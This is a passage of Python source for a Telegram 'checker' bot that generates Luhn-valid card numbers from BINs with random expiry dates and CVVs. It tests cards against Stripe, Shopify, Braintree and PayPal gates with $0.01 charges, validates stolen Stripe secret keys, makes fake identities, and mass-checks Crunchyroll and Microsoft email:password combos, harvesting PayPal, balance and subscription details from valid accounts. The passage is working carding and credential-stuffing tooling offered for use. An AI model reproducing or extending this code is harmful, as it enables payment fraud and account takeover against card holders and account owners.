    elif bin_4 in ('5018', '5020', '5038', '5612', '5893', '6304', '6759', '6761', '6762', '6763', '0604', '6390'):
        return ('Maestro', 16, 3)
    elif bin_2 in ('50', '56', '57', '58', '67', '68', '69'):
        return ('Maestro', 16, 3)
    else:
        return ('Unknown', 16, 3)

def generate_card_number(bin_number):
    """Generate a valid card number with Luhn check for any card type"""
    import random
    
    bin_str = str(bin_number)
    card_type, target_length, cvv_length = detect_card_type(bin_str)
    
    while len(bin_str) < target_length - 1:
        bin_str += str(random.randint(0, 9))
    
    for check_digit in range(10):
        card = bin_str + str(check_digit)
        if luhn_checksum(card) == 0:
            return card
    
    return bin_str + '0'

def replace_x_with_random(text):
    """Replace x/X characters with random digits"""
    import random
    result = ''
    for char in text:
        if char.lower() == 'x':
            result += str(random.randint(0, 9))
        else:
            result += char
    return result

def parse_partial_card(card_input):
    """Parse partial card input and return card parts with indicators for what's missing"""
    import random
    
    parts = card_input.split('|')
    
    # Default values
    card_number = None
    month = None
    year = None
    cvv = None
    
    # Parse card number (first part) - replace x's with random digits
    if len(parts) >= 1 and parts[0].strip():
        card_number = replace_x_with_random(parts[0].strip())
    
    # Parse month (second part)
    if len(parts) >= 2 and parts[1].strip() and parts[1].strip().lower() not in ['x', 'xx', 'xxx']:
        try:
            month_val = int(parts[1].strip())
            if 1 <= month_val <= 12:
                month = str(month_val).zfill(2)
        except:
            pass
    
    # Parse year (third part)
    if len(parts) >= 3 and parts[2].strip() and parts[2].strip().lower() not in ['x', 'xx', 'xxx', 'xxxx']:
        try:
            year_val = parts[2].strip()
            if len(year_val) == 2:
                year = year_val
            elif len(year_val) == 4 and year_val.startswith('20'):
                year = year_val
            else:
                year = None
        except:
            pass
    
    # Parse CVV (fourth part)
    if len(parts) >= 4 and parts[3].strip() and parts[3].strip().lower() not in ['x', 'xx', 'xxx', 'xxxx']:
        cvv_val = parts[3].strip()
        if cvv_val.isdigit() and len(cvv_val) in [3, 4]:
            cvv = cvv_val
    
    return {
        'card_number': card_number,
        'month': month,
        'year': year,
        'cvv': cvv
    }

def fill_missing_card_parts(parsed_card, bin_number=None):
    """Fill in missing card parts with random values"""
    import random
    
    result = parsed_card.copy()
    
    # Generate card number if missing
    if not result['card_number']:
        if bin_number:
            result['card_number'] = generate_card_number(bin_number)
        else:
            result['card_number'] = '4242424242424242'
    
    # Generate month if missing
    if not result['month']:
        result['month'] = str(random.randint(1, 12)).zfill(2)
    
    # Generate year if missing
    if not result['year']:
        result['year'] = str(random.randint(2024, 2030))
    
    # Generate CVV if missing
    if not result['cvv']:
        card_type, target_length, cvv_length = detect_card_type(result['card_number'][:6] if len(result['card_number']) >= 6 else result['card_number'])
        if cvv_length == 4:
            result['cvv'] = str(random.randint(1000, 9999))
        else:
            result['cvv'] = str(random.randint(100, 999))
    
    return result

async def gen_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
    import random
    import io
    
    if not is_registered(update.effective_user.id):
        await update.message.reply_text("⚠️ Please register first using /register")
        return
    
    if not context.args:
        await update.message.reply_text(
            "**Card Generator** 💳\n"
            "━━━━━━━━━━━━━━━━━\n"
            "**Usage:**\n"
            "`/gen <bin> <amount>`\n"
            "`/gen <partial_card> <amount>`\n\n"
            "**Examples:**\n"
            "`/gen 424242 10`\n"
            "`/gen 5154620057209320|06|2030| 5`\n"
            "`/gen 5154620057209320|06|| 10`\n"
            "`/gen 5154620057209320||2030| 3`\n"
            "`/gen 5154620057209320|xx|xx|xxx 15`\n\n"
            "**Supported formats:**\n"
            "• Full BIN: `424242`\n"
            "• Partial card: `card|mm|yyyy|cvv`\n"
            "• Missing parts: Use `|`, `||`, or `xx`\n"
            "━━━━━━━━━━━━━━━━━",
            parse_mode='Markdown'
        )
        return
    
    try:
        if len(context.args) == 1:
            first_arg = context.args[0]
            amount = 10
        elif len(context.args) > 1:
            try:
                amount = int(context.args[-1])
                first_arg = ' '.join(context.args[:-1])
            except ValueError:
                first_arg = ' '.join(context.args)
                amount = 10
        else:
            first_arg = context.args[0]
            amount = 10
        
        if amount < 1 or amount > 50:
            await update.message.reply_text("❌ Amount must be between 1 and 50")
            return
        
        # Detect if it's a partial card format or BIN
        is_partial_card = '|' in first_arg
        
        if is_partial_card:
            # PARTIAL CARD MODE - Parse and fill missing parts
            parsed = parse_partial_card(first_arg)
            
            # Get BIN from card number if available
            bin_number = parsed['card_number'][:6] if parsed['card_number'] and len(parsed['card_number']) >= 6 else None
            
            # Get BIN info if we have a card number
            bin_info = {}
            if bin_number:
                try:
                    response = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=10)
                    if response.status_code == 200:
                        bin_info = response.json()
                except:
                    pass
            
            # Generate cards based on the template
            cards = []
            for _ in range(amount):
                filled = fill_missing_card_parts(parsed.copy(), bin_number)
                
                # Format year properly
                year_str = filled['year']
                if len(year_str) == 4:
                    year_display = year_str
                elif len(year_str) == 2:
                    year_display = f"20{year_str}"
                else:
                    year_display = year_str
                
                cards.append(f"{filled['card_number']}|{filled['month']}|{year_display}|{filled['cvv']}")
            
            display_bin = bin_number if bin_number else "N/A"
            
        else:
            # TRADITIONAL BIN MODE
            bin_number = first_arg[:6]
            
            bin_info = {}
            try:
                response = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=10)
                if response.status_code == 200:
                    bin_info = response.json()
            except:
                pass
            
            card_type, target_length, cvv_length = detect_card_type(bin_number)
            
            cards = []
            for _ in range(amount):
                card_number = generate_card_number(bin_number)
                month = str(random.randint(1, 12)).zfill(2)
                year = random.randint(2024, 2030)
                
                if cvv_length == 4:
                    cvv = str(random.randint(1000, 9999))
                else:
                    cvv = str(random.randint(100, 999))
                
                cards.append(f"{card_number}|{month}|{year}|{cvv}")
            
            display_bin = bin_number
        
        username = update.effective_user.username or update.effective_user.first_name
        
        if amount <= 10:
            card_lines = '\n'.join([f"`{card}`" for card in cards])
            
            message = (
                f"**Card Generator** 💳\n"
                f"━━━━━━━━━━━━━━━━━\n"
                f"ᛋ Bin: `{display_bin}`\n"
                f"━━━━━━━━━━━━━━━━━\n"
                f"{card_lines}\n"
                f"━━━━━━━━━━━━━━━━━\n"
                f"ᛋ Info: {bin_info.get('brand', 'N/A')}\n"
                f"ᛋ Bank: {bin_info.get('bank', 'N/A')}\n"
                f"ᛋ Country: {bin_info.get('country_name', 'N/A')}\n"
                f"━━━━━━━━━━━━━━━━━\n"
                f"ᛋ Generate by: @{username}"
            )
            
            await update.message.reply_text(message, parse_mode='Markdown')
        else:
            file_content = '\n'.join(cards)
            file_bytes = io.BytesIO(file_content.encode('utf-8'))
            file_bytes.name = f'generated_cards_{display_bin if display_bin != "N/A" else "custom"}.txt'
            
            caption = (
                f"**Card Generator** 💳\n"
                f"━━━━━━━━━━━━━━━━━\n"
                f"ᛋ Bin: `{display_bin}`\n"
                f"ᛋ Amount: {amount} cards\n"
                f"ᛋ Info: {bin_info.get('brand', 'N/A')}\n"
                f"ᛋ Bank: {bin_info.get('bank', 'N/A')}\n"
                f"ᛋ Country: {bin_info.get('country_name', 'N/A')}\n"
                f"━━━━━━━━━━━━━━━━━\n"
                f"ᛋ Generate by: @{username}"
            )
            
            await update.message.reply_document(
                document=file_bytes,
                filename=f'generated_cards_{display_bin if display_bin != "N/A" else "custom"}.txt',
                caption=caption,
                parse_mode='Markdown'
            )
            
    except ValueError:
        await update.message.reply_text("❌ Invalid amount. Please enter a number.")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def me_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_registered(update.effective_user.id):
        await update.message.reply_text("⚠️ Please register first using /register")
        return
    
    user = update.effective_user
    users = load_users()
    user_data = users.get(str(user.id), {})
    
    message = (
        f"╔═══════════════════════╗\n"
        f"   👤 𝗬𝗢𝗨𝗥 𝗣𝗥𝗢𝗙𝗜𝗟𝗘\n"
        f"╚═══════════════════════╝\n\n"
        f"🆔 User ID: `{user.id}`\n"
        f"👤 Username: @{user.username or 'N/A'}\n"
        f"📝 Name: {user.first_name or 'N/A'}\n"
        f"📅 Registered: {user_data.get('registered_at', 'N/A')[:10]}\n"
        f"━━━━━━━━━━━━━━━━━━━━━"
    )
    
    await update.message.reply_text(message)

async def fake_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_registered(update.effective_user.id):
        await update.message.reply_text("⚠️ Please register first using /register")
        return
    
    if not context.args:
        await update.message.reply_text(
            "Usage: /fake <country_code>\n"
            "Example: /fake us",
            parse_mode='HTML'
        )
        return
    
    nationality = context.args[0].upper()
    
    processing_msg = await update.message.reply_text(
        "⏳ Generating fake identity...",
        parse_mode='HTML'
    )
    
    result = generate_fake_identity(nationality)
    message = format_fake_identity_message(result)
    
    await processing_msg.edit_text(message, parse_mode='HTML')

async def sk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_registered(update.effective_user.id):
        await update.message.reply_text("⚠️ Please register first using /register")
        return
    
    if not context.args:
        await update.message.reply_text(
            "Usage: /sk [stripe_secret_key]\n"
            "Example: /sk sk_test_51abc..."
        )
        return
    
    sk_key = context.args[0]
    
    processing_msg = await update.message.reply_text(
        "⏳ Checking SK key...",
        parse_mode='HTML'
    )
    
    result = check_stripe_sk(sk_key)
    message = format_sk_check_message(result)
    
    await processing_msg.edit_text(message, parse_mode='HTML')

async def info_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_registered(update.effective_user.id):
        await update.message.reply_text("⚠️ Please register first using /register")
        return
    
    if update.message.reply_to_message and update.message.reply_to_message.from_user:
        target_user = update.message.reply_to_message.from_user
    elif context.args:
        await update.message.reply_text("❌ Please reply to a user's message to check their info.")
        return
    else:
        target_user = update.effective_user
    
    message = (
        f"╔═══════════════════════════╗\n"
        f"   ℹ️ 𝗨𝗦𝗘𝗥 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡\n"
        f"╚═══════════════════════════╝\n\n"
        f"🆔 User ID: `{target_user.id}`\n"
        f"👤 Username: @{target_user.username or 'N/A'}\n"
        f"📝 Name: {target_user.first_name or 'N/A'}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━"
    )
    
    await update.message.reply_text(message)

async def clean_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_registered(update.effective_user.id):
        await update.message.reply_text("⚠️ Please register first using /register")
        return
    
    if not update.message.reply_to_message or not update.message.reply_to_message.document:
        await update.message.reply_text(
            "❌ Please reply to a .txt file with /clean\n"
            "This will extract and clean all credit cards from the file."
        )
        return
    
    file = await update.message.reply_to_message.document.get_file()
    content = await file.download_as_bytearray()
    text = content.decode('utf-8', errors='ignore')
    
    cards = []
    seen = set()
    
    for line in text.split('\n'):
        card_data = parse_card(line)
        if card_data:
            formatted = f"{card_data['number']}|{card_data['month']}|{card_data['year']}|{card_data['cvv']}"
            if formatted not in seen:
                cards.append(formatted)
                seen.add(formatted)
    
    if cards:
        cleaned_content = '\n'.join(cards)
        await update.message.reply_document(
            document=cleaned_content.encode('utf-8'),
            filename='cleaned_cards.txt',
            caption=f"✅ Cleaned {len(cards)} unique cards"
        )
    else:
        await update.message.reply_text("❌ No valid cards found in the file.")

async def split_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_registered(update.effective_user.id):
        await update.message.reply_text("⚠️ Please register first using /register")
        return
    
    if not update.message.reply_to_message or not update.message.reply_to_message.document:
        await update.message.reply_text(
            "❌ Usage: Reply to a .txt file with /split <amount>\n"
            "Example: /split 100"
        )
        return
    
    if not context.args or not context.args[0].isdigit():
        await update.message.reply_text("❌ Please specify the split amount.\nExample: /split 100")
        return
    
    split_size = int(context.args[0])
    
    file = await update.message.reply_to_message.document.get_file()
    content = await file.download_as_bytearray()
    lines = content.decode('utf-8', errors='ignore').split('\n')
    
    chunks = [lines[i:i + split_size] for i in range(0, len(lines), split_size)]
    
    for idx, chunk in enumerate(chunks, 1):
        chunk_content = '\n'.join(chunk)
        await update.message.reply_document(
            document=chunk_content.encode('utf-8'),
            filename=f'split_part_{idx}.txt',
            caption=f"📄 Part {idx}/{len(chunks)} ({len(chunk)} lines)"
        )

async def gate_placeholder(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_registered(update.effective_user.id):
        await update.message.reply_text("⚠️ Please register first using /register")
        return
    
    gate_name = context._chat_id_and_data[1].get('gate_name', 'Unknown')
    await update.message.reply_text(
        f"⚠️ {gate_name} Gate\n"
        "━━━━━━━━━━━━━━━\n\n"
        "This feature is currently under development.\n"
        "Please check back later!"
    )

async def check_stripe(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_registered(update.effective_user.id):
        await update.message.reply_text("⚠️ Please register first using /register")
        return
    await chk_command(update, context)

async def check_stripe_mass(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_registered(update.effective_user.id):
        await update.message.reply_text("⚠️ Please register first using /register")
        return
    await mchk_command(update, context)

async def check_shopify(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_registered(update.effective_user.id):
        await update.message.reply_text("⚠️ Please register first using /register")
        return
    await shopify_sh(update, context)

async def check_shopify_mass(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_registered(update.effective_user.id):
        await update.message.reply_text("⚠️ Please register first using /register")
        return
    await shopify_msh(update, context)

async def check_braintree(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_registered(update.effective_user.id):
        await update.message.reply_text("⚠️ Please register first using /register")
        return
    await braintree_br(update, context)

async def check_paypal(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_registered(update.effective_user.id):
        await update.message.reply_text("⚠️ Please register first using /register")
        return
    
    if not context.args:
        await update.message.reply_text(
            "❌ Usage: /pp <code>CARD|MM|YY/YYYY|CVV</code>\n"
            "Example: /pp 4987780029794225|06|2030|455 or /pp 5120899002486099|09|27|543",
            parse_mode='HTML'
        )
        return
    
    card_data = context.args[0]
    
    try:
        parts = card_data.split('|')
        if len(parts) != 4:
            await update.message.reply_text(
                "❌ Invalid format. Use: <code>CARD|MM|YY/YYYY|CVV</code>",
                parse_mode='HTML'
            )
            return
        
        cc, mm, yyyy, cvv = parts
        
        if not (len(cc) >= 13 and len(cc) <= 19 and cc.isdigit()):
            await update.message.reply_text("❌ Invalid card number", parse_mode='HTML')
            return
        if not (mm.isdigit() and 1 <= int(mm) <= 12):
            await update.message.reply_text("❌ Invalid month (01-12)", parse_mode='HTML')
            return
        
        if yyyy.isdigit():
            if len(yyyy) == 2:
                yyyy = f"20{yyyy}"
            elif len(yyyy) != 4:
                await update.message.reply_text("❌ Invalid year (YY or YYYY format)", parse_mode='HTML')
                return
        else:
            await update.message.reply_text("❌ Invalid year (YY or YYYY format)", parse_mode='HTML')
            return
        
        if not (cvv.isdigit() and 3 <= len(cvv) <= 4):
            await update.message.reply_text("❌ Invalid CVV (3-4 digits)", parse_mode='HTML')
            return
        
        checking_msg = await update.message.reply_text("⏳ Checking PayPal card...", parse_mode='HTML')
        
        import time
        import asyncio
        start_time = time.time()
        
        processor = PayPalProcessor()
        result = await asyncio.to_thread(processor.process_payment, cc, mm, yyyy, cvv)
        
        time_taken = round(time.time() - start_time, 2)
        
        bin_number = cc[:6]
        
        try:
            import aiohttp
            async with aiohttp.ClientSession() as session:
                url = f"https://bins.antipublic.cc/bins/{bin_number}"
                async with session.get(url) as response:
                    if response.status == 200:
                        bin_data = await response.json()
                        bin_type = bin_data.get('brand', 'N/A')
                        bin_country = bin_data.get('country_name', 'N/A')
                        bin_bank = bin_data.get('bank', 'N/A')
                    else:
                        bin_type = 'N/A'
                        bin_country = 'N/A'
                        bin_bank = 'N/A'
        except:
            bin_type = 'N/A'
            bin_country = 'N/A'
            bin_bank = 'N/A'
        
        card_display = f"{cc}|{mm}|{yyyy}|{cvv}"
        req_by = f"@{update.effective_user.username or update.effective_user.first_name}"
        
        if result['status'] == 'APPROVED':
            status_display = "APPROVED ✅"
        else:
            status_display = "DECLINED ❌"
        
        response_text = f"""み ¡@𝐓𝐎𝐣𝐢𝐂𝐇𝐊𝐁𝐨𝐭 ↯ ↝ 𝙍𝙚𝙨𝙪𝙡𝙩
𝐩𝐚𝐲𝐩𝐚𝐥 𝟎.𝟎𝟏$
━━━━━━━━━
𝐂𝐂 ➜ <code>{card_display}</code>
𝐒𝐓𝐀𝐓𝐔𝐒 ➜ {status_display}
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➜ {result['msg']}
━━━━━━━━━
𝐁𝐈𝐍 ➜ {bin_number}
𝐓𝐘𝐏𝐄 ➜ {bin_type}
𝐂𝐎𝐔𝐍𝐓𝐑𝐘 ➜ {bin_country}
𝐁𝐀𝐍𝐊 ➜ {bin_bank}
━━━━━━━━━
𝗧/𝘁 : {time_taken}s | 𝐏𝐫𝐨𝐱𝐲 : LIVE
𝐑𝐄𝐐 : {req_by}
𝐃𝐄𝐕 : @𝐌𝐔𝐌𝐈𝐑𝐔
"""
        
        await checking_msg.edit_text(response_text, parse_mode='HTML')
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}", parse_mode='HTML')

async def check_paypal_mass(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_registered(update.effective_user.id):
        await update.message.reply_text("⚠️ Please register first using /register")
        return
    
    user_id = update.effective_user.id
    username = update.effective_user.username if update.effective_user else None
    
    if not context.args:
        await update.message.reply_text(
            "❌ Usage: /mpp <code>CARD|MM|YY/YYYY|CVV CARD2|MM|YY/YYYY|CVV ...</code>\n"
            "Max 5 cards for users, unlimited for admins\n\n"
            "Example: /mpp 4987780029794225|06|2030|455 5120899003336863|07|28|842",
            parse_mode='HTML'
        )
        return
    
    cards_data = context.args
    
    if len(cards_data) > 5 and not is_admin(user_id, username):
        await update.message.reply_text("❌ Maximum 5 cards allowed per check for users! (Admins have unlimited access)", parse_mode='HTML')
        return
    
    await update.message.reply_text(f"⏳ Checking {len(cards_data)} PayPal card(s)...", parse_mode='HTML')
    
    import time
    import asyncio
    
    for idx, card_data in enumerate(cards_data, 1):
        try:
            parts = card_data.split('|')
            if len(parts) != 4:
                await update.message.reply_text(f"❌ Card {idx}: Invalid format", parse_mode='HTML')
                continue
            
            cc, mm, yyyy, cvv = parts
            
            if not (len(cc) >= 13 and len(cc) <= 19 and cc.isdigit()):
                await update.message.reply_text(f"❌ Card {idx}: Invalid card number", parse_mode='HTML')
                continue
            if not (mm.isdigit() and 1 <= int(mm) <= 12):
                await update.message.reply_text(f"❌ Card {idx}: Invalid month", parse_mode='HTML')
                continue
            
            if yyyy.isdigit():
                if len(yyyy) == 2:
                    yyyy = f"20{yyyy}"
                elif len(yyyy) != 4:
                    await update.message.reply_text(f"❌ Card {idx}: Invalid year", parse_mode='HTML')
                    continue
            else:
                await update.message.reply_text(f"❌ Card {idx}: Invalid year", parse_mode='HTML')
                continue
            
            if not (cvv.isdigit() and 3 <= len(cvv) <= 4):
                await update.message.reply_text(f"❌ Card {idx}: Invalid CVV", parse_mode='HTML')
                continue
            
            start_time = time.time()
            
            processor = PayPalProcessor()
            result = await asyncio.to_thread(processor.process_payment, cc, mm, yyyy, cvv)
            
            time_taken = round(time.time() - start_time, 2)
            
            bin_number = cc[:6]
            
            try:
                import aiohttp
                async with aiohttp.ClientSession() as session:
                    url = f"https://bins.antipublic.cc/bins/{bin_number}"
                    async with session.get(url) as response:
                        if response.status == 200:
                            bin_data = await response.json()
                            bin_type = bin_data.get('brand', 'N/A')
                            bin_country = bin_data.get('country_name', 'N/A')
                            bin_bank = bin_data.get('bank', 'N/A')
                        else:
                            bin_type = 'N/A'
                            bin_country = 'N/A'
                            bin_bank = 'N/A'
            except:
                bin_type = 'N/A'
                bin_country = 'N/A'
                bin_bank = 'N/A'
            
            card_display = f"{cc}|{mm}|{yyyy}|{cvv}"
            req_by = f"@{update.effective_user.username or update.effective_user.first_name}"
            
            if result['status'] == 'APPROVED':
                status_display = "APPROVED ✅"
            else:
                status_display = "DECLINED ❌"
            
            response_text = f"""み ¡@𝐓𝐎𝐣𝐢𝐂𝐇𝐊𝐁𝐨𝐭 ↯ ↝ 𝙍𝙚𝙨𝙪𝙡𝙩
𝐩𝐚𝐲𝐩𝐚𝐥 𝟎.𝟎𝟏$ [{idx}/{len(cards_data)}]
━━━━━━━━━
𝐂𝐂 ➜ <code>{card_display}</code>
𝐒𝐓𝐀𝐓𝐔𝐒 ➜ {status_display}
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➜ {result['msg']}
━━━━━━━━━
𝐁𝐈𝐍 ➜ {bin_number}
𝐓𝐘𝐏𝐄 ➜ {bin_type}
𝐂𝐎𝐔𝐍𝐓𝐑𝐘 ➜ {bin_country}
𝐁𝐀𝐍𝐊 ➜ {bin_bank}
━━━━━━━━━
𝗧/𝘁 : {time_taken}s | 𝐏𝐫𝐨𝐱𝐲 : LIVE
𝐑𝐄𝐐 : {req_by}
𝐃𝐄𝐕 : @𝐌𝐔𝐌𝐈𝐑𝐔
"""
            
            await update.message.reply_text(response_text, parse_mode='HTML')
            
        except Exception as e:
            await update.message.reply_text(f"❌ Card {idx}: Error - {str(e)}", parse_mode='HTML')

async def check_crunchyroll(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_registered(update.effective_user.id):
        await update.message.reply_text("⚠️ Please register first using /register")
        return
    
    if not context.args:
        await update.message.reply_text("❌ **Usage:** `/cr email:password`")
        return
    
    account_data = ' '.join(context.args)
    
    # Parse email:password
    if ':' in account_data:
        parts = account_data.split(':', 1)
        email, password = parts[0].strip(), parts[1].strip()
    elif '|' in account_data:
        parts = account_data.split('|', 1)
        email, password = parts[0].strip(), parts[1].strip()
    else:
        await update.message.reply_text("❌ **Invalid format!** Use: `/cr email:password`")
        return
    
    checking_msg = await update.message.reply_text("🔄 **Checking Crunchyroll account...**")
    
    checker = CrunchyrollChecker()
    result = await checker.check_account(email, password)
    
    if result['success']:
        response = f"✅ **VALID ACCOUNT**\n━━━━━━━━━━━━━━━\n📧 Email: `{email}`\n🔑 Status: {result['status']}\n💬 {result['message']}"
    else:
        response = f"❌ **INVALID ACCOUNT**\n━━━━━━━━━━━━━━━\n📧 Email: `{email}`\n🔑 Status: {result['status']}\n💬 {result['message']}"
    
    await checking_msg.edit_text(response, parse_mode='Markdown')

async def check_crunchyroll_mass(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_registered(update.effective_user.id):
        await update.message.reply_text("⚠️ Please register first using /register")
        return
    
    user_id = update.effective_user.id
    
    if context.args:
        accounts_text = ' '.join(context.args)
        accounts = [acc.strip() for acc in accounts_text.split(',') if acc.strip()]
        if len(accounts) > 5000 and not is_admin(user_id):
            await update.message.reply_text("❌ Max 5000 accounts for users! Admins have no limit.")
            return
        context.user_data['accounts'] = accounts
        await process_crunchyroll_accounts(update, context)
    else:
        await update.message.reply_text(
            "📋 Mass Crunchyroll Checker\n\n"
            "Send email:password combos (one per line) or separated by comma\n\n"
            "Supported formats:\n"
            "• email:password\n"
            "• email|password\n\n"
            "Max: 5000 for users, unlimited for admins"
        )
        return CR_WAITING_ACCOUNTS

async def check_microsoft(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_registered(update.effective_user.id):
        await update.message.reply_text("⚠️ Please register first using /register")
        return
    
    if not context.args:
        await update.message.reply_text("❌ Usage: /ms email:password")
        return
    
    account_data = ' '.join(context.args)
    
    if ':' not in account_data and '|' not in account_data:
        await update.message.reply_text("❌ Invalid format! Use: /ms email:password")
        return
    
    if ':' in account_data:
        email, password = account_data.split(':', 1)
    else:
        email, password = account_data.split('|', 1)
    
    email, password = email.strip(), password.strip()
    checking_msg = await update.message.reply_text("🔄 Checking Microsoft account...")
    
    try:
        proxies = [MS_GLOBAL_SETTINGS['proxy']] if MS_GLOBAL_SETTINGS['proxy'] else None
        checker = AdvancedHotmailChecker(proxies=proxies)
        result = await checker.check_account(email, password)
        
        if result.status == "SUCCESS":
            response = "✅ 𝗩𝗔𝗟𝗜𝗗 𝗔𝗖𝗖𝗢𝗨𝗡𝗧\n"
            response += "━━━━━━━━━━━━━━━━━━━━━━\n"
            response += f"📧 Email: `{email}`\n"
            response += f"🔑 Password: `{password}`\n"
            response += f"🟢 Status: SUCCESS\n"
            response += "━━━━━━━━━━━━━━━━━━━━━━\n"
            
            if result.name:
                response += f"👤 Name: {result.name}\n"
            if result.country:
                response += f"🌍 Country: {result.country}\n"
            if result.birthdate:
                response += f"🎂 Birth: {result.birthdate}\n"
            
            response += "\n📊 𝗔𝗰𝗰𝗼𝘂𝗻𝘁 𝗜𝗻𝗳𝗼:\n"
            if result.unread_messages is not None:
                response += f"📬 Unread: {result.unread_messages}\n"
            if result.total_messages is not None:
                response += f"📨 Total: {result.total_messages}\n"
            if result.inbox_count is not None:
                response += f"📥 Inbox: {result.inbox_count}\n"
            
            response += "\n💳 𝗣𝗮𝘆𝗺𝗲𝗻𝘁 & 𝗦𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻𝘀:\n"
            
            if result.netflix_subscription:
                response += "✅ Netflix: YES\n"
            else:
                response += "❌ Netflix: NO\n"
            
            if result.disney_subscription:
                response += "✅ Disney+: YES\n"
            else:
                response += "❌ Disney+: NO\n"
            
            if result.xbox_linked:
                response += "✅ Xbox: LINKED\n"
            else:
                response += "❌ Xbox: NOT LINKED\n"
            
            if result.paypal_email:
                response += f"✅ PayPal: {result.paypal_email}\n"
            else:
                response += "❌ PayPal: NO\n"
            
            if result.supercell_linked:
                response += "✅ Supercell: LINKED\n"
            else:
                response += "❌ Supercell: NO\n"
            
            if result.payment_balance:
                response += f"\n💰 Balance: ${result.payment_balance}\n"
            
            if result.payment_methods:
                response += f"💳 Methods: {', '.join(result.payment_methods)}\n"
            
            if result.total_orders:
                response += f"🛍 Orders: {result.total_orders}\n"
            
            response += "━━━━━━━━━━━━━━━━━━━━━━"
        elif result.status == "2FACTOR":
            response = f"⚠️ 2FA ENABLED\n━━━━━━━━━━━━━━━\n📧 Email: {email}\n🔑 Status: {result.status}"
        else:
            response = f"❌ INVALID ACCOUNT\n━━━━━━━━━━━━━━━\n📧 Email: {email}\n🔑 Status: {result.status}"
        
        await checking_msg.edit_text(response, parse_mode='Markdown')
    except Exception as e:
        await checking_msg.edit_text(f"❌ Error: {str(e)}")

async def check_microsoft_mass(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass Microsoft checker - supports file, text, and reply to file"""
    if not is_registered(update.effective_user.id):
        await update.message.reply_text("⚠️ Please register first using /register")
        return
    
    user_id = update.effective_user.id
    
    # Check if this is a reply to a file
    if update.message.reply_to_message and update.message.reply_to_message.document:
        await mass_check_microsoft_file(update, context)
        return
    
    # Check if user sent a file with the command
    if update.message.document:
        await mass_check_microsoft_file(update, context)
        return
    
    # Check if user provided accounts as text/arguments
    if context.args:
        accounts_text = ' '.join(context.args)
        accounts = [acc.strip() for acc in accounts_text.split(',') if acc.strip()]
        if len(accounts) > 5000 and not is_admin(user_id):
            await update.message.reply_text("❌ Max 5000 accounts for users! Admins have no limit.")
            return
        context.user_data['accounts'] = accounts
        await process_microsoft_accounts(update, context)
        return
    
    # Show usage instructions
    await update.message.reply_text(
        "📋 Mass Microsoft Checker\n\n"
        "𝗨𝘀𝗮𝗴𝗲:\n"
        "1️⃣ Reply to a file with /mss\n"
        "2️⃣ Send file with /mss as caption\n"
        "3️⃣ /mss email:pass,email:pass\n"
        "4️⃣ Send text with accounts (one per line)\n\n"
        "𝗙𝗼𝗿𝗺𝗮𝘁: email:password or email|password\n"
        "𝗠𝗮𝘅: 5000 for users, unlimited for admins"
    )
    return MS_WAITING_ACCOUNTS

async def process_microsoft_accounts(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    accounts = context.user_data.get('accounts', [])
    
    if not accounts:
        await update.message.reply_text("❌ No accounts provided!")
        return
    
    proxies = [MS_GLOBAL_SETTINGS['proxy']] if MS_GLOBAL_SETTINGS['proxy'] else None
    
    hits = []
    hits_detailed = []
    twofa = []
    invalid = []
    errors = []
    checked_count = [0]  # Use list to allow modification in nested function
    msg = await update.message.reply_text(f"⏳ Starting check...\n📋 Total: {len(accounts)} accounts\n⚡ Using 25 workers")
    
    try:
        async def check_single_account(account, checker):
            """Check a single account and update counters"""
            try:
                if ':' in account:
                    email, password = account.split(':', 1)
                elif '|' in account:
                    email, password = account.split('|', 1)
                else:
                    invalid.append(f"INVALID_FORMAT:{account}")
                    checked_count[0] += 1
                    return
                
                result = await checker.check_account(email.strip(), password.strip())
                
                if result.status == "SUCCESS":
                    hit_line = f"{email}:{password}"
                    details = []
                    
                    if result.name:
                        details.append(f"Name={result.name}")
                    if result.country:
                        details.append(f"Country={result.country}")
                    
                    subs = []
                    if result.netflix_subscription:
                        subs.append("Netflix")
                    if result.disney_subscription:
                        subs.append("Disney+")
                    if result.xbox_linked:
                        subs.append("Xbox")
                    if result.paypal_email:
                        subs.append(f"PayPal({result.paypal_email})")
                    if result.supercell_linked:
                        subs.append("Supercell")
                    
                    if subs:
                        details.append(f"Subs=[{','.join(subs)}]")
                    
                    if result.payment_balance:
                        details.append(f"Balance=${result.payment_balance}")
                    
                    if result.payment_methods:
                        details.append(f"PayMethods={','.join(result.payment_methods)}")
                    
                    if result.total_orders:
                        details.append(f"Orders={result.total_orders}")
                    
                    if result.unread_messages is not None:
                        details.append(f"Unread={result.unread_messages}")
                    
                    if details:
                        hit_line += f" | {' | '.join(details)}"
                    
                    hits.append(f"{email}:{password}")
                    hits_detailed.append(hit_line)
                elif result.status == "2FACTOR":
                    twofa.append(f"2FA:{email}:{password}")
                elif result.status in ["INVALID", "INCORRECT"]:
